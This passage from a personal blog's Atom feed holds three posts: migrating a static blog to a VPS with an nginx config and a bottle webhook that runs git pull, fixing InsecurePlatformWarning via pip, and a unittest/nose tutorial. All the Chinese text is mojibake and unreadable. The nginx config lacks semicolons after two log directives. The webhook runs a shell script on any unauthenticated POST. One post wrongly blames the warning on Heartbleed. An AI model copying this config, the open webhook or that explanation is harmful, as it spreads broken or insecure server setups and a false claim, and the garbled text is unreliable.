<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">server &#123;</div><div class="line">    listen 80;                              # ç›‘å¬ç«¯å£</div><div class="line">    server_name server;</div><div class="line">    root /home/ubuntu/blog;                 # æ‰˜ç®¡ç›®å½•</div><div class="line">    index index.html;</div><div class="line">    access_log /var/log/nginx/access_blog.log</div><div class="line">    error_log /var/log/nginx/error_blog.log</div><div class="line"></div><div class="line">    # ç¦æ­¢å¯¹.gitç›®å½•çš„è®¿é—®</div><div class="line">    location ^~ /.git &#123;</div><div class="line">        deny all;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>é…ç½®å®Œæˆåï¼Œé‡å¯Nginx, æ‰€æœ‰æœåŠ¡æ­£å¸¸è¿è¡Œï¼Œè®¿é—®.gitç›®å½•æ—¶ä¼šè¿”å›403.</p>
<p><em>SimpleHTTPServeråœ¨å»ºç«‹æœåŠ¡å™¨çš„æ—¶å€™åªèƒ½ç›‘å¬<code>0.0.0.0</code>è€Œä¸èƒ½åªç›‘å¬<code>127.0.0.1</code>, ä¹‹å‰æ­å»ºæœåŠ¡å™¨çš„æ—¶å€™ç”¨çš„SimpleHTTPServer+Nginxåå‘ä»£ç†ï¼Œç°åœ¨çœ‹èµ·æ¥æ„Ÿè§‰æˆ‘å°±æ˜¯ä¸ªå‚»é€¼â€¦</em></p>
<h2 id="22-webhook">2.2 å€ŸåŠ©Webhookå®ç°åšå®¢çš„è‡ªåŠ¨éƒ¨ç½²</h2>
<p>å› ä¸ºä¹‹å‰é™æ€åšå®¢æ‰˜ç®¡åœ¨Github Pagesä¸Šï¼Œæ‰€ä»¥å‘Github Repoä¸Šé¢è¿›è¡Œpushæ“ä½œä¹‹åä¼šåŠ¨æ€æ›´æ–°é¡µé¢ã€‚ä½†æ˜¯å¦‚æœå°†é™æ€åšå®¢æ‰˜ç®¡åœ¨VPSä¸Šï¼Œåˆ™éœ€è¦æ¯æ¬¡æ‰§è¡Œ<code>git pull</code>æ‰èƒ½å¤Ÿå°†å†…å®¹æ›´æ–°ã€‚æ‰€ä»¥æˆ‘åœ¨VPSä¸Šå†™äº†ä¸€ä¸ªè„šæœ¬ï¼Œèƒ½å¤Ÿåœ¨Pushä¹‹åè‡ªåŠ¨è¿›è¡Œ<code>git pull</code>æ¥æ›´æ–°å†…å®¹ã€‚</p>
<ol>
<li>
<p>åœ¨Githubä¸Šçš„repoè®¾ç½®Webhook
åœ¨repoçš„è®¾ç½®é¡µé¢å¯ä»¥è®¾ç½®Webhook, å¯åœ¨è¯¥repoæ”¶åˆ°pushä¹‹åï¼ŒGithubå¯ä»¥å‘ä¸€ä¸ªç‰¹å®šçš„URLå‘é€ä¸€ä¸ªPOSTè¯·æ±‚ã€‚æ‰€ä»¥æˆ‘è®¾ç½®äº†ä¸€ä¸ªWebhook, åœ¨pushä¹‹åå¯ä»¥å‘æˆ‘çš„VPSçš„ç‰¹å®šç«¯å£å‘é€POSTè¯·æ±‚ã€‚</p>
</li>
<li>
<p>è®¾ç½®æœåŠ¡å™¨æ¥æ”¶Webhook
åœ¨VPSä¸­é…ç½®ä¸€ä¸ªæœåŠ¡å™¨ï¼Œå¼€æ”¾VPSçš„ä¸€ä¸ªç«¯å£æ¥æ¥æ”¶æ¥è‡ªGithubçš„Webhookï¼Œè¿™é‡Œä½¿ç”¨bottleæ¥æ­å»ºæœåŠ¡å™¨æ¡†æ¶ã€‚æœåŠ¡å™¨ä»£ç :</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding: utf-8</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="meta">@route("/push", method=["POST"])    # ç›‘å¬Webhook</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">pull</span><span class="params">()</span>:</span></div><div class="line">    os.system(<span class="string">"./auto_pull.sh"</span>)     <span class="comment"># æ‰§è¡Œgit pullè„šæœ¬</span></div><div class="line">    <span class="keyword">return</span> <span class="string">"OK"</span></div><div class="line"></div><div class="line">run(host=<span class="string">"0.0.0.0"</span>, port=<span class="number">23333</span>)</div></pre></td></tr></table></figure>
<ol start="3">
<li>ç¼–å†™è‡ªåŠ¨pullè„šæœ¬
ç¼–å†™è‡ªåŠ¨pullè„šæœ¬<code>auto_pull.sh</code>:</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env sh</div><div class="line"></div><div class="line">cd ~/blog</div><div class="line">git pull</div></pre></td></tr></table></figure>
<p>è¿è¡ŒæœåŠ¡å™¨ï¼Œåˆ™å¯ç›‘å¬23333ç«¯å£çš„POSTè¯·æ±‚ï¼Œç„¶åè‡ªåŠ¨æ‰§è¡Œ<code>git pull</code>æ›´æ–°åšå®¢å†…å®¹ã€‚</p>
<h1 id="3">3. åè®°</h1>
<p>è‡³æ­¤ï¼Œåšå®¢<strong>éƒ¨åˆ†</strong>æˆåŠŸè¿ç§»åˆ°VPS.
ä¸ºä»€ä¹ˆè¦è¯´â€œéƒ¨åˆ†â€ï¼Ÿå› ä¸ºæˆ‘çš„åŸŸååœ¨åšå¤‡æ¡ˆå•ŠQvQå¤‡æ¡ˆå¥½éº»çƒ¦è¿˜è¦æ‰“å°ææ–™è¿˜è¦è·‘åˆ°å¸‚ä¸­å¿ƒå»ç…§ç›¸è¿˜è¦å‘å¿«é€’åˆ°åŒ—äº¬QvQéƒ½åšå¥½è¿˜å¾—ç­‰å¾…ç®¡å±€å®¡æ ¸QvQ
åæ§½æ—¶é—´ç»“æŸã€‚åé¢ç­‰åŸŸåå¤‡æ¡ˆå¥½ä»¥åå¯èƒ½ä¼šé¼“æ£ä¸€é˜µå­Nginxï¼Œä¸ºæœåŠ¡å™¨å¯ç”¨HTTPSç­‰â€¦
<strong>å”‰ï¼Œè¿˜æ˜¯å…ˆå»å¤ä¹ å§_(:Ğ·ã‚âˆ )_</strong></p>
<p>_åœ¨å†™åšæ–‡æ—¶ï¼Œå»ç¼–è¯‘å‡çº§äº†ä¸€ä¸‹Nginx, é¼“æ£é…ç½®æ–‡ä»¶åˆå¼„äº†åŠå¤©_â•®(â•¯_â•°)â•­</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ˜¨å¤©ä¹°äº†ä¸€ä¸ªVPSã€ä¸€ä¸ªåŸŸåï¼Œå†³å®šæŠŠåšå®¢è¿ç§»åˆ°VPSä¸Šã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="ä¹±ä¸ƒå…«ç³Ÿ" scheme="//blog.stdioa.com/categories/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F/"/>
    
    
      <category term="python" scheme="//blog.stdioa.com/tags/python/"/>
    
      <category term="Github" scheme="//blog.stdioa.com/tags/Github/"/>
    
      <category term="nginx" scheme="//blog.stdioa.com/tags/nginx/"/>
    
  </entry>
  
  <entry>
    <title>éšæ‰‹è®° - è§£å†³InsecurePlatformWarning</title>
    <link href="//blog.stdioa.com/2015/12/essay-solve-InsecurePlatformWarning/"/>
    <id>//blog.stdioa.com/2015/12/essay-solve-InsecurePlatformWarning/</id>
    <published>2015-12-07T15:01:00.000Z</published>
    <updated>2016-11-08T13:48:35.493Z</updated>
    
    <content type="html"><![CDATA[<p>ç¬¬ä¸‰æ¬¡åœ¨VPSä¸Šé¢è§£å†³ä½¿ç”¨requestsæŠ¥InsecurePlatformWarningè­¦å‘Šçš„é—®é¢˜ã€‚ä¹‹å‰æ¯æ¬¡éƒ½è¦æŸ¥èµ„æ–™æŠ˜è…¾å¥½ä¹…ï¼Œè¿™æ¬¡å†³å®šæŠŠå®ƒè®°ä¸‹æ¥ã€‚</p>
<a id="more"></a>
<h1 id="1">1. å¹²è´§</h1>
<ul>
<li>
<p>Debianç±»ç³»ç»Ÿ</p>
<ol>
<li><code>sudo apt-get install python-dev libssl-dev</code></li>
<li><code>sudo pip install -U requests[security]</code></li>
</ol>
</li>
<li>
<p>Redhatç±»ç³»ç»Ÿ</p>
<ol>
<li><code>sudo yum install python-devel openssl-devel</code></li>
<li><code>sudo pip install -U requests[security]</code></li>
</ol>
</li>
</ul>
<h1 id="2">2. éœ€æ±‚</h1>
<p>è‡ªå·±çš„VPSç³»ç»Ÿæœ‰ç‚¹è€(Ubuntu 14.04 LTS), æ‰€ä»¥pythonç‰ˆæœ¬ä¹Ÿæ¯”è¾ƒè½å(Python 2.7.3), ä»Šå¤©æ”¹ä»£ç éœ€è¦ç”¨åˆ°requestsæ–°ç‰ˆæœ¬ä¸­æä¾›çš„åŠŸèƒ½ï¼Œä½†æ˜¯requestså‡çº§åå‘é€HTTPSè¯·æ±‚æ—¶ä¼šæŠ¥å‡ºInsecurePlatformWarning, è¿™æ˜¯ä¸€ä¸ªç”±opensslæ¼æ´(Heartbleed)é€ æˆçš„è­¦å‘Šï¼Œæ‰€ä»¥éœ€è¦å‡çº§pyopensslç­‰æ¨¡å—ã€‚</p>
<h1 id="3">3. å‡çº§è¿‡ç¨‹</h1>
<p>pypiæä¾›äº†ä¸€ä¸ªå‡çº§åŒ…ï¼Œå«åš<code>requests[security]</code>, ç”¨pipè¿›è¡Œå‡çº§å³å¯ã€‚è¾“å…¥<code>sudo pip install requests[security]</code>å‘½ä»¤åï¼ŒpipæŠ¥é”™ï¼Œæ‰å‘ç°ä¸èƒ½æœ¬åœ°ç¼–è¯‘pythonåŒ…ï¼Œé‚å®‰è£…<code>python-dev</code>. ç„¶åå†æ¬¡å®‰è£…æ—¶å‘ç°ç¼ºå°‘<code>openssl/aes.h</code>å¤´æ–‡ä»¶ï¼Œåˆå»å®‰è£…opensslçš„å¼€å‘åŒ…<code>libssl-dev</code>, å†æ¬¡å®‰è£…ï¼Œå®‰è£…æˆåŠŸã€‚</p>
<h1 id="4">4. å‚è€ƒèµ„æ–™</h1>
<ol>
<li><a href="http://blog.csdn.net/blog/henulwj/48131393" target="_blank" rel="external">[åŸ]pipå®‰è£…æ¨¡å—è­¦å‘ŠInsecurePlatformWarning</a></li>
<li><a href="http://stackoverflow.com/questions/30539798/zsh-no-matches-found-requestssecurity" target="_blank" rel="external">zsh - no matches found: requests[security]</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ç¬¬ä¸‰æ¬¡åœ¨VPSä¸Šé¢è§£å†³ä½¿ç”¨requestsæŠ¥InsecurePlatformWarningè­¦å‘Šçš„é—®é¢˜ã€‚ä¹‹å‰æ¯æ¬¡éƒ½è¦æŸ¥èµ„æ–™æŠ˜è…¾å¥½ä¹…ï¼Œè¿™æ¬¡å†³å®šæŠŠå®ƒè®°ä¸‹æ¥ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="éšæ‰‹è®°" scheme="//blog.stdioa.com/categories/%E9%9A%8F%E6%89%8B%E8%AE%B0/"/>
    
    
      <category term="python" scheme="//blog.stdioa.com/tags/python/"/>
    
      <category term="openssl" scheme="//blog.stdioa.com/tags/openssl/"/>
    
      <category term="requests" scheme="//blog.stdioa.com/tags/requests/"/>
    
  </entry>
  
  <entry>
    <title>Pythonå­¦ä¹ ä¹‹unittest</title>
    <link href="//blog.stdioa.com/2015/11/learning-python-unittest/"/>
    <id>//blog.stdioa.com/2015/11/learning-python-unittest/</id>
    <published>2015-11-12T10:53:02.000Z</published>
    <updated>2016-11-08T13:48:35.538Z</updated>
    
    <content type="html"><![CDATA[<p>å•å…ƒæµ‹è¯•ï¼Œå·¥ç¨‹å¼€å‘ä¸­é‡è¦çš„ä¸€ç¯ã€‚</p>
<a id="more"></a>
<h1 id="1">1. ç®€ä»‹</h1>
<p>å•å…ƒæµ‹è¯•æ˜¯ç”¨æ¥å¯¹ä¸€ä¸ªæ¨¡å—ã€ä¸€ä¸ªå‡½æ•°æˆ–è€…ä¸€ä¸ªç±»æ¥è¿›è¡Œæ­£ç¡®æ€§æ£€éªŒçš„æµ‹è¯•å·¥ä½œã€‚</p>
<h1 id="2-unittest">2. ä½¿ç”¨unittestè¿›è¡Œæµ‹è¯•</h1>
<p>unittestæ˜¯Pythonè‡ªå¸¦çš„å•å…ƒæµ‹è¯•æ¨¡å—ï¼Œé€šè¿‡ç¼–å†™æµ‹è¯•ç±»ï¼Œåœ¨æµ‹è¯•ç±»ä¸­ç¼–å†™æµ‹è¯•å‡½æ•°çš„æ–¹å¼è¿›è¡Œæµ‹è¯•ã€‚
ä¸çŸ¥é“è¯¥æµ‹è¯•ä»€ä¹ˆï¼Œå°±å¯¹pythonçš„listå¯¹è±¡æµ‹è¯•ä¸€ä¸‹å¥½äº†ã€‚</p>
<h2 id="21">2.1 ç¼–å†™æµ‹è¯•æ–‡ä»¶</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding: utf-8</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> unittest                                 <span class="comment"># ä½¿ç”¨unittestæ¨¡å—</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestStringMethods</span><span class="params">(unittest.TestCase)</span>:</span>     <span class="comment"># æµ‹è¯•ç±»éœ€ç»§æ‰¿è‡ªunittest.TestCase</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setUp</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="comment"># åœ¨å‡½æ•°é‡Œè¿›è¡Œæµ‹è¯•ä¹‹å‰éœ€è¦è¿›è¡Œçš„ä¸€äº›å‡†å¤‡å·¥ä½œï¼ŒsetUpåœ¨æ¯æ¬¡æµ‹è¯•ä¹‹å‰éƒ½ä¼šè¿è¡Œä¸€æ¬¡</span></div><div class="line">        self.d = []</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_empty</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="string">"""\</span></div><div class="line">        Empty testcase</div><div class="line">        """</div><div class="line">        self.assertEqual([], [])                <span class="comment"># è‹¥aå’Œbç›¸ç­‰åˆ™é€šè¿‡</span></div><div class="line">        self.assertNotEqual([<span class="number">1</span>], [])            <span class="comment"># è‹¥ä¸ç›¸ç­‰åˆ™é€šè¿‡</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_bool</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="string">"""\</span></div><div class="line">        Bool transform testcase</div><div class="line">        """</div><div class="line">        self.assertTrue([<span class="number">1</span>])                    <span class="comment"># è‹¥å†…éƒ¨çš„è¡¨è¾¾å¼æˆ–å¯¹è±¡ä¸ºçœŸåˆ™é€šè¿‡</span></div><div class="line">        self.assertFalse([])                    <span class="comment"># ä¸ºå‡åˆ™é€šè¿‡</span></div><div class="line">        self.assertTrue(bool([<span class="number">1</span>]))</div><div class="line">        self.assertFalse(bool([]))</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_append</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="string">"""\</span></div><div class="line">        Append testcase</div><div class="line">        """</div><div class="line">        list_ = []</div><div class="line">        list_.append(<span class="number">1</span>)</div><div class="line">        self.assertEqual(list_, [<span class="number">1</span>])</div><div class="line">        self.assertNotEqual(list_, [])</div><div class="line">        list_.append(<span class="number">2</span>)</div><div class="line">        self.assertIn(<span class="number">1</span>, list_)                 <span class="comment"># è‹¥a in båˆ™é€šè¿‡</span></div><div class="line">        self.assertNotIn(<span class="number">3</span>, list_)              <span class="comment"># è‹¥a not in båˆ™é€šè¿‡</span></div><div class="line">        self.assertTrue(list_[<span class="number">0</span>] == <span class="number">1</span>)</div><div class="line">        self.assertEqual(list_[<span class="number">1</span>], <span class="number">2</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_instance</span><span class="params">(self)</span>:</span></div><div class="line">        list_ = []</div><div class="line">        self.assertIsInstance(list_, list)      <span class="comment"># è‹¥isinstance(a, b)ä¸ºçœŸåˆ™é€šè¿‡</span></div><div class="line">        self.assertNotIsInstance(list_, str)    <span class="comment"># è‹¥isinstance(a, b)ä¸ºå‡åˆ™é€šè¿‡</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_index</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="string">"""\</span></div><div class="line">        Index testcase</div><div class="line">        """</div><div class="line">        list_ = []</div><div class="line">        <span class="keyword">with</span> self.assertRaises(IndexError):     <span class="comment"># æ£€æµ‹æ˜¯å¦æœ‰å¼‚å¸¸æŠ›å‡ºï¼Œæœ‰æŒ‡å®šå¼‚å¸¸æŠ›å‡ºåˆ™é€šè¿‡</span></div><div class="line">            a = list_[<span class="number">0</span>]</div><div class="line"></div><div class="line">        list_ = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</div><div class="line">        self.assertEqual(list_[<span class="number">1</span>], <span class="number">2</span>)</div><div class="line">        self.assertEqual(list_[<span class="number">-2</span>], <span class="number">2</span>)</div><div class="line"></div><div class="line">        <span class="keyword">with</span> self.assertRaises(IndexError):</div><div class="line">            a = list_[<span class="number">4</span>]</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tearDown</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="comment"># åœ¨æµ‹è¯•ä¹‹åéœ€è¦è¿›è¡Œçš„ä¸€äº›å¤„ç†äº‹é¡¹ï¼ŒtearDownåœ¨æ¯æ¬¡æµ‹è¯•ä¹‹åéƒ½ä¼šè¿è¡Œä¸€æ¬¡</span></div><div class="line">        <span class="keyword">del</span> self.d</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    __import__(<span class="string">"sys"</span>).argv.append(<span class="string">"-v"</span>)         <span class="comment"># é‡‡ç”¨verboseæ–¹å¼ï¼Œè¾“å‡ºæµ‹è¯•ä¿¡æ¯</span></div><div class="line">    unittest.main()</div></pre></td></tr></table></figure>
<h2 id="22">2.2 è¿è¡Œæµ‹è¯•</h2>
<ul>
<li>ç›´æ¥è¿è¡Œæµ‹è¯•ç¨‹åºï¼Œè¾“å‡º:</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">test_append (__main__.TestStringMethods)</div><div class="line">Append testcase ... ok</div><div class="line">test_bool (__main__.TestStringMethods)</div><div class="line">Bool transform testcase ... ok</div><div class="line">test_empty (__main__.TestStringMethods)</div><div class="line">Empty testcase ... ok</div><div class="line">test_index (__main__.TestStringMethods)</div><div class="line">Index testcase ... ok</div><div class="line">test_instance (__main__.TestStringMethods) ... ok</div><div class="line"></div><div class="line">----------------------------------------------------------------------</div><div class="line">Ran 5 tests <span class="keyword">in</span> 0.001s</div><div class="line"></div><div class="line">OK</div></pre></td></tr></table></figure>
<ul>
<li>è¿è¡Œ<code>python -m unittest test.py</code>ä¹Ÿå¯ä»¥è¿›è¡Œæµ‹è¯•ï¼›</li>
<li>è¿è¡Œ<code>python -m unittest</code>, unittestä¼šåœ¨å½“å‰æ–‡ä»¶å¤¹ä¸­å¯»æ‰¾æµ‹è¯•ç±»è¿›è¡Œæµ‹è¯•ï¼ˆçœŸæ™ºèƒ½ï¼‰ï¼›</li>
<li>è‹¥æœ‰æµ‹è¯•æœªé€šè¿‡ï¼Œunittestä¼šåœ¨æµ‹è¯•æ—¶æŠ¥å‘ŠFAIL, å¹¶åœ¨æµ‹è¯•ç»“æŸåå°†æ‰€æœ‰æœªé€šè¿‡æµ‹è¯•çš„é¡¹ç›®åˆ—å‡ºã€‚</li>
</ul>
<h1 id="3-nose">3. ä½¿ç”¨Noseè¿›è¡Œå•å…ƒæµ‹è¯•</h1>
<p>Noseæ˜¯ä¸€ä¸ªå¯¹unittestçš„æ‰©å±•æµ‹è¯•æ¡†æ¶ï¼Œèƒ½è‡ªåŠ¨å‘ç°å¹¶è¿è¡Œæµ‹è¯•ã€‚ä½¿ç”¨Noseï¼Œå¯ä»¥å°†å•å…ƒæµ‹è¯•ä»£ç çš„ç¼–å†™å˜å¾—æ›´ç®€å•ï¼Œä¸ç”¨å†æ„é€ æµ‹è¯•ç±»ï¼Œåªéœ€è¦åœ¨ä»¥<code>test</code>å¼€å¤´çš„æ–‡ä»¶ä¸­å»ºç«‹ä»¥<code>test</code>å¼€å¤´çš„å‡½æ•°å³å¯ã€‚</p>
<h2 id="31">3.1 ç¼–å†™æµ‹è¯•æ–‡ä»¶</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding: utf-8</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> nose</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_nose_installed_successfully</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">import</span> nose                         <span class="comment"># è¿è¡Œæµ‹è¯•ä»£ç </span></div><div class="line">    <span class="keyword">assert</span> <span class="keyword">True</span>                         <span class="comment"># assert Trueè¡¨ç¤ºæµ‹è¯•æˆåŠŸ</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_obviously_failed</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">assert</span> <span class="keyword">False</span>                        <span class="comment"># assert Falseè¡¨ç¤ºæµ‹è¯•å¤±è´¥ï¼Œæµ‹è¯•æ—¶ä¼šæŠ¥"FAIL"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_returns_an_exception</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">raise</span> ValueError                    <span class="comment"># è‹¥æŠ›å‡ºé™¤AssertionErrorçš„å¼‚å¸¸ï¼Œæµ‹è¯•æ—¶ä¼šæŠ¥"ERROR"</span></div><div class="line"></div><div class="line">nose.main()</div></pre></td></tr></table></figure>
<h2 id="32">3.2 è¿è¡Œæµ‹è¯•æ–‡ä»¶</h2>
<p>noseè‡ªå¸¦å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ‰€ä»¥åªéœ€è¦è¾“å…¥<code>nosetests [æµ‹è¯•æ–‡ä»¶å]</code>å³å¯ï¼Œè‹¥æµ‹è¯•æ–‡ä»¶åä¸ºç©ºï¼Œåˆ™nosetestä¼šåœ¨å½“å‰æ–‡ä»¶å¤¹å¯»æ‰¾æ‰€æœ‰æµ‹è¯•ã€‚ä»¥ä¸‹å‘½ä»¤æ ¼å¼å‡å¯æ¥å—ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">nosetests test.module</div><div class="line">nosetests another.test:TestCase.test_method</div><div class="line">nosetests a.test:TestCase</div><div class="line">nosetests /path/to/<span class="built_in">test</span>/file.py:test_function</div></pre></td></tr></table></figure>
<p>è¿è¡Œ<code>nosetests test_with_nose -v</code>ï¼Œè¾“å‡ºï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">$ nosetests test_with_nose -v</div><div class="line">test_with_nose.test_nose_installed_successfully ... ok</div><div class="line">test_with_nose.test_obviously_failed ... FAIL</div><div class="line">test_with_nose.test_returns_an_exception ... ERROR</div><div class="line"></div><div class="line">======================================================================</div><div class="line">ERROR: test_with_nose.test_returns_an_exception</div><div class="line">----------------------------------------------------------------------</div><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">"c:\python35\lib\site-packages\nose\case.py"</span>, line 198, <span class="keyword">in</span> runTest</div><div class="line">    self.test(*self.arg)</div><div class="line">  File <span class="string">"C:\Users\Stdio\Desktop\temp\utest\test_with_nose.py"</span>, line 13, <span class="keyword">in</span> test_returns_an_exception</div><div class="line">    raise ValueError</div><div class="line">ValueError</div><div class="line"></div><div class="line">======================================================================</div><div class="line">FAIL: test_with_nose.test_obviously_failed</div><div class="line">----------------------------------------------------------------------</div><div class="line">Traceback (most recent call last):</div><div class="line"> File <span class="string">"c:\python35\lib\site-packages\nose\case.py"</span>, line 198, <span class="keyword">in</span> runTest</div><div class="line">   self.test(*self.arg)</div><div class="line">  File <span class="string">"C:\Users\Stdio\Desktop\temp\utest\test_with_nose.py"</span>, line 10, <span class="keyword">in</span> test_obviously_failed</div><div class="line">   assert False</div><div class="line">AssertionError</div><div class="line"></div><div class="line">----------------------------------------------------------------------</div><div class="line">Ran 3 tests <span class="keyword">in</span> 0.003s</div><div class="line"></div><div class="line">FAILED (errors=1, failures=1)</div></pre></td></tr></table></figure>
<h1 id="4">4. å‚è€ƒæ–‡æ¡£</h1>
<ol>
<li><a href="https://docs.python.org/3/library/unittest.html" target="_blank" rel="external">unitest - Python Doc</a></li>
<li><a href="http://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/00143191629979802b566644aa84656b50cd484ec4a7838000" target="_blank" rel="external">å•å…ƒæµ‹è¯• - å»–é›ªå³°çš„pythonæ•™ç¨‹</a></li>
<li><a href="https://nose.readthedocs.org/en/latest/" target="_blank" rel="external">Nose documentation</a></li>
<li><a href="http://blog.csdn.net/linda1000/article/details/8533349" target="_blank" rel="external">Pythonçš„å­¦ä¹ ï¼ˆåå…«ï¼‰---- å•å…ƒæµ‹è¯•å·¥å…·nose</a></li>
</ol>
<h1 id="5">5. åè®°</h1>
<p>æ‹–äº†ä¸€ä¸ªæœˆï¼Œè¿™ä¸ªå‘å†ä¸å¡«æ—¥å­æ²¡æ³•è¿‡äº†(â•¯â€µâ–¡â€²)â•¯ï¸µâ”»â”â”»
åˆ°ç°åœ¨æ²¡ç»™è‡ªå·±çš„ä»£ç å†™è¿‡æµ‹è¯•ï¼Œä¹Ÿæ˜¯é†‰â€¦
ä¸€ç›´æƒ³è½¬Py3ä¸€ç›´æ²¡è½¬ï¼Œæ˜¨å¤©æ”¹äº†ç¯å¢ƒå˜é‡ï¼Œå¼ºè¿«è‡ªå·±ç”¨ä¸€é˜µå­ï¼Œå¤šå»çœ‹çœ‹Py3çš„ç‰¹æ€§ï¼Œæœ‰æ—¶é—´æ•´ç†ä¸€ä¸‹ã€‚
Gitçš„å‘è¿˜æ²¡å¡«å®Œä¸è¿‡è‡ªå·±çš„Pro Gitçœ‹çš„å·®ä¸å¤šäº†ï¼Œè²Œä¼¼ä¹Ÿæ»¡è¶³è‡ªå·±çš„éœ€æ±‚äº†ï¼Œå‡†å¤‡å¼ƒå‘ã€‚
ä¸‹ä¸€ç¯‡æœ‰å¯èƒ½æ˜¯SQLAlchemy, MongoDB, Flaskâ€¦å“ï¼Œéšå®ƒå»å§ã€‚</p>
]]></content>
    
    <summary type="html">
    
